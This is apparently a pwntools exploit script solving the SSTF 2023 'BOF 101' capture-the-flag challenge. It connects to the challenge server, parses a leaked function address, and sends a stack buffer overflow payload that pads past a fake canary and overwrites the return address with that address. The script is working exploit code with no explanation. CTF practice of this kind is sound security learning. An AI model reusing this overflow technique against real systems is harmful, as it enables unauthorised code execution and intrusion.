#SSTF 2023 BOF 101

#!/usr/bin/env python3

from pwn import *

#context.update(arch='i386', os='linux')
context.terminal= [ "tmux","splitw","-h"]

p = remote("bof101.sstf.site", 1337)

#p = process("./bof101")
#gdb.attach(p, gdbscript='''
#b main''')

#p = process("./bof101")

p.recvuntil("addr: ")
printFlagAddr = p.recvuntil("\nWhat")
tempAddr = printFlagAddr.split(b"\n")[0]
actualAddr = int(tempAddr.decode("utf-8"),16)

p.recvuntil("name?")

canary = p64(0xdeadbeef)
cyclicNumber = cyclic_find(0x6261616b)
payload = cyclic(cyclicNumber) + canary
cyclicNumberTwo = cyclic_find(0x61616162)

p.sendline(payload+cyclic(cyclicNumberTwo)+p64(actualAddr))
print(p.recv())

p.interactive()
